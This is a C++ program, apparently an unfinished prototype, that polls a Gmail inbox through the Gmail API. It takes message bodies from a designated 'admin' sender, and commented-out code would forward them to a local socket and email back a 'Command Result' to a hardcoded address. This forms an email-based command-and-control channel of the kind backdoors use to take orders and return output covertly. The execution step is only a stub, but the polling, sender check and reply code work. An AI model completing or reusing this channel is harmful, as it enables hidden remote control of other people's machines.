#include <iostream>
#include <string>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <cpr/cpr.h>
#include <nlohmann/json.hpp>
#include <vector>
#include <thread>
#include <unordered_set> 

#pragma comment(lib, "Ws2_32.lib")

#define DEFAULT_PORT "12345"
#define DEFAULT_BUFLEN 512

using json = nlohmann::json;

std::string base64_encode(const std::string& input) {
    static const char* base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string encoded;
    int val = 0, valb = -6;
    for (unsigned char c : input) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            encoded.push_back(base64_chars[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) encoded.push_back(base64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
    while (encoded.size() % 4) encoded.push_back('=');
    return encoded;
}

std::string base64_decode(const std::string& input) {
    static const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; i++) T[base64_chars[i]] = i;

    std::string decoded;
    int val = 0, valb = -8;
    for (unsigned char c : input) {
        if (T[c] == -1) break;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            decoded.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return decoded;
}

std::string getAccessToken(const std::string& refreshToken, const std::string& clientId, const std::string& clientSecret) {
    cpr::Response r = cpr::Post(cpr::Url{ "https://oauth2.googleapis.com/token" },
        cpr::Payload{ {"client_id", clientId},
                     {"client_secret", clientSecret},
                     {"refresh_token", refreshToken},
                     {"grant_type", "refresh_token"} });
    if (r.status_code != 200) {
        std::cerr << "Failed to get access token: " << r.status_code << std::endl;
        return "";
    }

    auto jsonData = json::parse(r.text);
    return jsonData["access_token"].get<std::string>();
}

void sendEmail(const std::string& accessToken, const std::string& to, const std::string& subject, const std::string& body) {
    std::string email = "From: jakeva123kl@gmail.com\r\nTo: " + to + "\r\nSubject: " + subject + "\r\n\r\n" + body;
    std::string rawMessage = "{\"raw\": \"" + base64_encode(email) + "\"}";

    cpr::Response r = cpr::Post(cpr::Url{ "https://www.googleapis.com/gmail/v1/users/me/messages/send" },
        cpr::Header{ {"Authorization", "Bearer " + accessToken},
                    {"Content-Type", "application/json"} },
        cpr::Body{ rawMessage });
    if (r.status_code != 200) {
        std::cerr << "Failed to send email: " << r.status_code << std::endl;
    }
    else {
        std::cout << "Email sent successfully" << std::endl;
    }
}

std::string getEmail(const std::string& accessToken, const std::string& messageId) {
    cpr::Response r = cpr::Get(cpr::Url{ "https://www.googleapis.com/gmail/v1/users/me/messages/" + messageId },
        cpr::Header{ {"Authorization", "Bearer " + accessToken} });
    if (r.status_code != 200) {
        std::cerr << "Failed to get email: " << r.status_code << std::endl;
        return "";
    }
    else {
        auto jsonData = json::parse(r.text);
        std::string encodedBody = jsonData["payload"]["parts"][0]["body"]["data"].get<std::string>();
        return base64_decode(encodedBody);
    }
}

std::string getMessageId(const std::string& accessToken) {
    cpr::Response r = cpr::Get(cpr::Url{ "https://www.googleapis.com/gmail/v1/users/me/messages" },
        cpr::Header{ {"Authorization", "Bearer " + accessToken} });
    if (r.status_code != 200) {
        std::cerr << "Failed to list emails: " << r.status_code << std::endl;
        return "";
    }
    else {
        auto jsonData = json::parse(r.text);
        std::string messageId = jsonData["messages"][0]["id"].get<std::string>();
        return messageId;
    }
}

bool isAdmin(const std::string& accessToken, const std::string& senderEmail, const std::string& messageId) {
    cpr::Response r = cpr::Get(cpr::Url{ "https://www.googleapis.com/gmail/v1/users/me/messages/" + messageId },
        cpr::Header{ {"Authorization", "Bearer " + accessToken} });

    if (r.status_code == 200) {
        auto emailData = json::parse(r.text);
        for (const auto& header : emailData["payload"]["headers"]) {
            if (header["name"] == "From" && header["value"].get<std::string>().find(senderEmail) != std::string::npos) {
                return true;
            }
        }
    }

    return false;
}

void send_request(const std::string& server, const std::string& request, std::string& response) {
    //Socket programming
}

int main() {
    std::string clientId = "";
    std::string clientSecret = "";
    std::string refreshToken = "";
    std::string accessToken = getAccessToken(refreshToken, clientId, clientSecret);
    std::string senderEmail = "";

    if (!accessToken.empty()) {
        std::unordered_set<std::string> processedMessageIds;
        std::string messageId = getMessageId(accessToken);
        processedMessageIds.insert(messageId);

        while (true) {
            
            messageId = getMessageId(accessToken);

            if (processedMessageIds.find(messageId) == processedMessageIds.end() && isAdmin(accessToken, senderEmail, messageId)) {
                std::string emailContent = getEmail(accessToken, messageId);

                std::cout << emailContent << std::endl;

                processedMessageIds.insert(messageId);

              
                //std::string response;
                //send_request("127.0.0.1", emailContent, response);

                //sendEmail(accessToken, "hieunguyen.jc@gmail.com", "Command Result", response);*/
            }
        }
    }
    else {
        std::cerr << "Error" << std::endl;
    }

    return 0;
}